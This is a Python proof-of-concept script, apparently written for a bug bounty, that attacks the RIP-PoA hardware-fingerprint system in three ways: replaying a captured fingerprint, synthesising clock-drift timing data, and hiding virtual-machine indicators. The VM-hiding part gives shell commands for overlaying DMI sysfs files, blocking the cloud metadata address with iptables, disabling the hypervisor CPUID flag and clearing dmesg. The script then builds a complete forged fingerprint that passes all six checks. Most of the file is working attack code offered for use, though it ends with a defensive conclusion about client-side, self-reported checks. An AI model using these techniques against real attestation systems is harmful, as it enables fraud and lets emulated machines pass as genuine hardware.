#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""
RIP-PoA Fingerprint Replay & Spoofing PoC — Bounty #248

Demonstrates three attack vectors against the hardware fingerprint system:
1. Fingerprint Replay — record and replay a legitimate machine's fingerprint
2. Clock Drift Spoofing — forge oscillator CV to pass clock-skew checks
3. Anti-Emulation Bypass — mask VM indicators on a virtual machine

CONTEXT: AUTHORIZED security research under Scottcjn's bug bounty program.
"""

import hashlib
import json, tempfile, os
import os
import random
import statistics
import time


# ─── ATTACK 1: Fingerprint Replay ────────────────────────────────────

def capture_fingerprint(output_path: str = "/tmp/captured_fingerprint.json") -> dict:
    """
    Simulates capturing a REAL machine's fingerprint output.
    In practice, an attacker runs the miner once on real hardware,
    captures the JSON from _run_fingerprint_checks(), and saves it.
    """
    # This is what a REAL machine produces (realistic values)
    real_fingerprint = {
        "checks": {
            "clock_drift": {
                "passed": True,
                "data": {
                    "mean_ns": 142567,
                    "stdev_ns": 3891,
                    "cv": 0.027291,
                    "drift_stdev": 2103,
                },
            },
            "cache_timing": {
                "passed": True,
                "data": {
                    "l1_ns": 3.82,
                    "l2_ns": 11.47,
                    "l3_ns": 38.91,
                    "l2_l1_ratio": 3.002,
                    "l3_l2_ratio": 3.392,
                },
            },
            "simd_identity": {
                "passed": True,
                "data": {
                    "profile": "x86-avx2",
                    "features": ["sse", "sse2", "avx", "avx2"],
                    "hash": "a3b7c91d",
                },
            },
            "thermal_drift": {
                "passed": True,
                "data": {
                    "entropy": 0.612,
                    "samples": 50,
                    "drift_rate": 0.0031,
                },
            },
            "instruction_jitter": {
                "passed": True,
                "data": {
                    "jitter_cv": 0.0183,
                    "samples": 100,
                    "mean_ns": 8923,
                },
            },
            "anti_emulation": {
                "passed": True,
                "data": {
                    "vm_indicators": [],
                    "paths_checked": [
                        "/sys/class/dmi/id/product_name",
                        "/sys/class/dmi/id/sys_vendor",
                        "/sys/class/dmi/id/board_vendor",
                    ],
                    "dmesg_scanned": True,
                    "metadata_checked": True,
                },
            },
        },
        "all_passed": True,
    }

    with open(output_path, "w") as f:
        json.dump(real_fingerprint, f, indent=2)

    return real_fingerprint


def replay_fingerprint(captured_path: str = "/tmp/captured_fingerprint.json") -> dict:
    """
    Replays a previously captured fingerprint from ANY machine.

    The miner's _run_fingerprint_checks() stores results in self.fingerprint_data.
    The server's record_fleet_signals_from_request() accepts this dict directly.
    There is NO challenge-response binding — the server trusts the client's claim.

    Attack: Replace _run_fingerprint_checks() with:
        fp_path = os.path.join(tempfile.gettempdir(), "captured_fingerprint.json")
        self.fingerprint_data = json.load(open(fp_path))
        self.fingerprint_passed = True
    """
    with open(captured_path) as f:
        replayed = json.load(f)

    # Attacker can optionally add small jitter to avoid exact-match detection
    replayed["checks"]["clock_drift"]["data"]["cv"] += random.uniform(-0.001, 0.001)
    replayed["checks"]["thermal_drift"]["data"]["entropy"] += random.uniform(-0.01, 0.01)

    return replayed


# ─── ATTACK 2: Clock Drift Spoofing ──────────────────────────────────

def spoof_clock_drift(target_cv: float = 0.025, samples: int = 200) -> dict:
    """
    Generates synthetic timing data that passes the clock-skew check.

    The check requires:
    - cv > 0.0001 (rejects perfectly uniform timing)
    - drift_stdev > 0 (rejects zero drift)

    An attacker can generate data with any desired CV by controlling
    the injected noise amplitude. No real hardware measurement needed.
    """
    # Pick a realistic mean (like a real CPU would produce)
    base_mean_ns = 140000

    # Generate synthetic intervals with controlled CV
    target_stdev = base_mean_ns * target_cv
    intervals = [
        int(random.gauss(base_mean_ns, target_stdev))
        for _ in range(samples)
    ]

    mean_ns = statistics.mean(intervals)
    stdev_ns = statistics.stdev(intervals)
    cv = stdev_ns / mean_ns if mean_ns > 0 else 0

    drift_pairs = [intervals[i] - intervals[i - 1] for i in range(1, len(intervals))]
    drift_stdev = statistics.stdev(drift_pairs) if len(drift_pairs) > 1 else 0

    result = {
        "passed": True,
        "data": {
            "mean_ns": int(mean_ns),
            "stdev_ns": int(stdev_ns),
            "cv": round(cv, 6),
            "drift_stdev": int(drift_stdev),
        },
    }

    # Verify it passes the checks
    assert cv > 0.0001, f"CV too low: {cv}"
    assert drift_stdev > 0, f"Drift stdev is zero"

    return result


# ─── ATTACK 3: Anti-Emulation Bypass ─────────────────────────────────

def bypass_anti_emulation_techniques() -> dict:
    """
    Documents and demonstrates techniques to bypass the anti-emulation check.

    The check looks for:
    1. DMI strings containing VM vendor names (vmware, virtualbox, kvm, etc.)
    2. Cloud metadata endpoints (169.254.169.254)
    3. Hypervisor CPUID flag
    4. dmesg VM-related messages

    Bypass techniques:
    """
    techniques = {
        "dmi_masking": {
            "description": "Override DMI strings via sysfs or custom ACPI tables",
            "commands": [
                "# Mount writable overlay on /sys/class/dmi/id/",
                "mount -t tmpfs tmpfs /sys/class/dmi/id/",
                "echo 'Dell Inc.' > /sys/class/dmi/id/sys_vendor",
                "echo 'OptiPlex 7090' > /sys/class/dmi/id/product_name",
                "echo 'Dell Inc.' > /sys/class/dmi/id/board_vendor",
                "echo 'Dell Inc.' > /sys/class/dmi/id/bios_vendor",
            ],
            "difficulty": "trivial",
        },
        "metadata_blocking": {
            "description": "Block cloud metadata endpoint with iptables",
            "commands": [
                "iptables -A OUTPUT -d 169.254.169.254 -j DROP",
                "# Or redirect to localhost",
                "iptables -t nat -A OUTPUT -d 169.254.169.254 -j DNAT --to-destination 127.0.0.1",
            ],
            "difficulty": "trivial",
        },
        "cpuid_masking": {
            "description": "Hide hypervisor CPUID flag using KVM's -cpu host,hv_vendor_id=0",
            "commands": [
                "# KVM: Disable hypervisor extensions",
                "qemu-system-x86_64 -cpu host,-hypervisor ...",
                "# VirtualBox: VBoxManage modifyvm <vm> --paravirtprovider none",
            ],
            "difficulty": "easy",
        },
        "dmesg_filtering": {
            "description": "Clear or filter dmesg to remove VM-related messages",
            "commands": [
                "dmesg -C  # Clear kernel ring buffer",
                "# Or restrict dmesg access",
                "sysctl -w kernel.dmesg_restrict=1",
            ],
            "difficulty": "trivial",
        },
        "process_name_masking": {
            "description": "Rename VM-related processes",
            "commands": [
                "# VirtualBox Guest Additions",
                "systemctl mask vboxadd.service",
                "# VMware Tools",
                "systemctl mask vmtoolsd.service",
            ],
            "difficulty": "trivial",
        },
    }

    # Build a clean anti-emulation result as if on bare metal
    clean_result = {
        "passed": True,
        "data": {
            "vm_indicators": [],
            "paths_checked": [
                "/sys/class/dmi/id/product_name",
                "/sys/class/dmi/id/sys_vendor",
                "/sys/class/dmi/id/board_vendor",
                "/sys/class/dmi/id/board_name",
                "/sys/class/dmi/id/bios_vendor",
                "/sys/class/dmi/id/chassis_vendor",
                "/sys/class/dmi/id/chassis_asset_tag",
                "/proc/scsi/scsi",
            ],
            "dmesg_scanned": True,
            "metadata_checked": True,
        },
    }

    return {
        "techniques": techniques,
        "forged_result": clean_result,
        "summary": (
            "All 5 bypass techniques are trivial to implement. "
            "The anti-emulation check relies entirely on client-side inspection "
            "of system files that an attacker with root access can modify."
        ),
    }


# ─── COMBINED: Full Spoofed Fingerprint ──────────────────────────────

def build_complete_spoofed_fingerprint() -> dict:
    """
    Builds a complete spoofed fingerprint that passes all 6 checks,
    demonstrating that the entire fingerprint system can be defeated.
    """
    clock = spoof_clock_drift(target_cv=0.025)
    anti_emu = bypass_anti_emulation_techniques()

    return {
        "checks": {
            "clock_drift": clock,
            "cache_timing": {
                "passed": True,
                "data": {
                    "l1_ns": round(random.uniform(3.5, 4.5), 2),
                    "l2_ns": round(random.uniform(10.0, 12.0), 2),
                    "l3_ns": round(random.uniform(35.0, 42.0), 2),
                    "l2_l1_ratio": round(random.uniform(2.5, 3.5), 3),
                    "l3_l2_ratio": round(random.uniform(3.0, 4.0), 3),
                },
            },
            "simd_identity": {
                "passed": True,
                "data": {
                    "profile": "x86-avx2",
                    "features": ["sse", "sse2", "avx", "avx2"],
                    "hash": hashlib.md5(b"x86-avx2").hexdigest()[:8],
                },
            },
            "thermal_drift": {
                "passed": True,
                "data": {
                    "entropy": round(random.uniform(0.55, 0.70), 3),
                    "samples": 50,
                    "drift_rate": round(random.uniform(0.002, 0.005), 4),
                },
            },
            "instruction_jitter": {
                "passed": True,
                "data": {
                    "jitter_cv": round(random.uniform(0.015, 0.025), 4),
                    "samples": 100,
                    "mean_ns": random.randint(8000, 10000),
                },
            },
            "anti_emulation": anti_emu["forged_result"],
        },
        "all_passed": True,
    }


def main():
    random.seed(42)

    print("=" * 70)
    print("RIP-PoA Fingerprint Replay & Spoofing — Proof of Concept")
    print("=" * 70)

    # Attack 1: Replay
    print("\n[ATTACK 1] Fingerprint Replay")
    print("-" * 40)
    captured = capture_fingerprint()
    print(f"  Captured fingerprint with {len(captured['checks'])} checks")
    replayed = replay_fingerprint()
    print(f"  Replayed from file — all_passed: {replayed['all_passed']}")
    print(f"  Clock CV: {replayed['checks']['clock_drift']['data']['cv']:.6f}")
    print("  ⚠️  Server accepts replayed data — no challenge-response binding")

    # Attack 2: Clock Drift Spoofing
    print("\n[ATTACK 2] Clock Drift Spoofing")
    print("-" * 40)
    for target in [0.015, 0.025, 0.040, 0.060]:
        spoofed = spoof_clock_drift(target_cv=target)
        actual_cv = spoofed["data"]["cv"]
        print(f"  Target CV={target:.3f} → Actual CV={actual_cv:.6f} passed={spoofed['passed']}")
    print("  ⚠️  Attacker can produce any desired CV value synthetically")

    # Attack 3: Anti-Emulation Bypass
    print("\n[ATTACK 3] Anti-Emulation Bypass")
    print("-" * 40)
    bypass = bypass_anti_emulation_techniques()
    for name, tech in bypass["techniques"].items():
        print(f"  [{tech['difficulty']:>7s}] {name}: {tech['description']}")
    print(f"  ⚠️  {bypass['summary']}")

    # Combined: Full spoofed fingerprint
    print("\n[COMBINED] Complete Spoofed Fingerprint")
    print("-" * 40)
    full = build_complete_spoofed_fingerprint()
    all_pass = all(
        c.get("passed", c.get("forged_result", {}).get("passed", False))
        if isinstance(c, dict) and "passed" not in c
        else c.get("passed", False)
        for c in full["checks"].values()
    )
    print(f"  All checks passed: {full['all_passed']}")
    for name, check in full["checks"].items():
        passed = check.get("passed", False)
        print(f"    {name:25s}: {'✅ PASS' if passed else '❌ FAIL'}")
    print("  ⚠️  A VM with these bypasses is indistinguishable from real hardware")

    print("\n" + "=" * 70)
    print("CONCLUSION: The fingerprint system has a fundamental architectural flaw.")
    print("All checks run CLIENT-SIDE and results are self-reported as JSON.")
    print("There is no server-side verification or challenge-response protocol.")
    print("=" * 70)


if __name__ == "__main__":
    main()
